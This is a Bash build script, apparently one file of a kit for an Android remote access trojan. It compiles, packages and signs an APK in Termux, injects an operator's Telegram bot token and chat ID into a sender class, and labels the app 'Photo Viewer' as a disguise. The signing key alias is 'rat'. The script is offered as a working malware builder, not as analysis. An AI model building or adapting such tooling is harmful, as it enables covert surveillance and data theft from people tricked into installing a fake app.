---

## 📄 File 2: `build.sh`

```bash
#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
#  build.sh — Termux me APK build karta hai
#  Usage:  ./build.sh <BOT_TOKEN> <CHAT_ID> [APP_NAME]
#  Example: ./build.sh 123456:ABC-DEF 987654321 "Photo Viewer"
# ============================================================
set -e

BOT_TOKEN="${1:?Usage: ./build.sh <BOT_TOKEN> <CHAT_ID> [APP_NAME]}"
CHAT_ID="${2:?CHAT_ID bhi do}"
APP_NAME="${3:-Photo Viewer}"

PKG="com.secure.labs.phototool"
OUT_DIR="dist"
ANDROID_JAR="$HOME/.android/android.jar"
PLATFORM_ZIP="platform-33_r02.zip"

mkdir -p src obj dex "$OUT_DIR" "$HOME/.android"

echo "[*] APP_NAME  : $APP_NAME"
echo "[*] BOT_TOKEN : ${BOT_TOKEN:0:8}..."
echo "[*] CHAT_ID   : $CHAT_ID"

# ---------- 1. android.jar (pehli baar download hoga) ----------
if [ ! -f "$ANDROID_JAR" ]; then
    echo "[*] android.jar download ho raha hai..."
    curl -L -o "/tmp/$PLATFORM_ZIP" "https://dl.google.com/android/repository/$PLATFORM_ZIP"
    rm -rf /tmp/p33 && mkdir -p /tmp/p33
    unzip -o -q "/tmp/$PLATFORM_ZIP" -d /tmp/p33
    find /tmp/p33 -name "android.jar" -exec cp {} "$ANDROID_JAR" \;
fi

# ---------- 2. Token + Chat ID inject ----------
echo "[*] Token inject ho raha hai..."
sed -i "s|__BOT_TOKEN__|${BOT_TOKEN}|g; s|__CHAT_ID__|${CHAT_ID}|g" \
    "src/$PKG/TelegramSender.java"

# ---------- 3. Manifest me app name ----------
echo "[*] App label update..."
sed -i "s|android:label=\"[^\"]*\"|android:label=\"${APP_NAME}\"|" AndroidManifest.xml

# ---------- 4. Java compile (ecj) ----------
echo "[*] Java compile..."
find "src/$PKG" -name "*.java" > sources.txt
rm -rf obj && mkdir -p obj
ecj -source 1.8 -target 1.8 -classpath "$ANDROID_JAR" -d obj @sources.txt

# ---------- 5. DEX (d8, nahi to dx) ----------
echo "[*] DEX ban raha hai..."
rm -rf dex && mkdir -p dex
if command -v d8 >/dev/null 2>&1; then
    d8 --lib "$ANDROID_JAR" --release --output dex $(find obj -name "*.class")
else
    dx --dex --output=dex/classes.dex obj
fi

# ---------- 6. APK package (aapt) ----------
echo "[*] APK package..."
aapt package -f -M AndroidManifest.xml -I "$ANDROID_JAR" -F build.apk \
    --min-sdk-version 21 --target-sdk-version 33 \
    --version-code 1 --version-name "1.0"

# ---------- 7. classes.dex add ----------
cd dex
aapt add ../build.apk classes.dex
cd ..

# ---------- 8. zipalign ----------
zipalign -f 4 build.apk aligned.apk

# ---------- 9. Sign ----------
if [ ! -f keystore.jks ]; then
    echo "[*] Keystore ban raha hai..."
    keytool -genkeypair -keystore keystore.jks -alias rat \
        -keyalg RSA -keysize 2048 -validity 10000 \
        -storepass 123456 -keypass 123456 \
        -dname "CN=Android, OU=Lab, O=Lab, L=City, S=State, C=US"
fi
echo "[*] APK sign..."
if command -v apksigner >/dev/null 2>&1; then
    apksigner sign --ks keystore.jks --ks-key-alias rat \
        --ks-pass pass:123456 --key-pass pass:123456 \
        --out "$OUT_DIR/$APP_NAME.apk" aligned.apk
else
    echo "[!] apksigner nahi mila — jarsigner try (purane devices only)"
    jarsigner -keystore keystore.jks -storepass 123456 -keypass 123456 \
        -sigalg SHA256withRSA -digestalg SHA-256 \
        -signedjar "$OUT_DIR/$APP_NAME.apk" aligned.apk rat
fi

rm -f build.apk aligned.apk sources.txt
echo ""
echo "[+] DONE! APK ready: $OUT_DIR/$APP_NAME.apk"
ls -lh "$OUT_DIR/$APP_NAME.apk"
